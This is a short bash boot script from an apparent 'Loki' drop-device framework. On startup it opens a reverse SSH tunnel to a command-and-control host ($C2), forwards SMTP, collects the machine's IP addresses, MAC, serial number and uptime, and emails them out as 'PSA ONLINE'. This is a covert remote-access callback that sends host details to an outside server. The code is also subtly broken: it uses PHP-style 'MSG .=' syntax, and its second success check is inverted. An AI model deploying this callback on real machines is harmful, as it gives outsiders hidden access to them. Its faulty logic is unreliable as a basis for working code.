#!/bin/bash
###############################################################################
# onboot.sh - This is the parent script for all of the other loki scripts.
#
# Requirements
#
# Mod History:
# 21 May 2019 - nju - created file from Loki framework
############################################################################### 

source /opt/einar/client/config.sh

# Setup our SSH Tunnel
sudo -u $C2USER ssh -p $SSHPORT -R $PROXYPORT:localhost:22 $C2USER@$C2 -C -i /home/$C2USER/.ssh/id_ecdsa -N -f -n
if [ $? == 1 ]; then 
		MSG .= "Failed to establish SSH  Tunnel"
	fi

	sudo -u $C2USER ssh -p $SSHPORT -L 2525:localhost:25 $C2USER@$C2 -C -i /home/$C2USER/.ssh/id_ecdsa -N -f -n
	if [ $? -eq 0 ]; then
		MSG .= "Failed to establish SMTP Tunnel"
	fi
	


		WAN_IP=$(curl ifconfig.me)
		LAN_IP=$($IFCONFIG eno1 | grep "inet " | awk '{print $2}' )
		#SERIAL=$(dmidecode -s system-serial-number)
		SERIAL=$(cat $LOKIHOME/SERIAL)
		UPTIME=$(uptime)
		MAC=$(/sbin/ifconfig eno1 | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}')

		echo "LAN IP = $LAN_IP " > $LOKIHOME/netinfo
		echo "WAN IP = $WAN_IP" >> $LOKIHOME/netinfo
		echo "SSH Proxy Port = $PROXYPORT" >> $LOKIHOME/netinfo 
		echo $MSG >>  $LOKIHOME/netinfo

		echo "===========================" >> $LOKIHOME/netinfo
		echo "Serial = $SERIAL" >> $LOKIHOME/netinfo
		echo "MAC = $MAC" >> $LOKIHOME/netinfo
		echo "Uptime = $UPTIME" >> $LOKIHOME/netinfo

		mail -s "PSA ONLINE" $DESTEMAIL < $LOKIHOME/netinfo

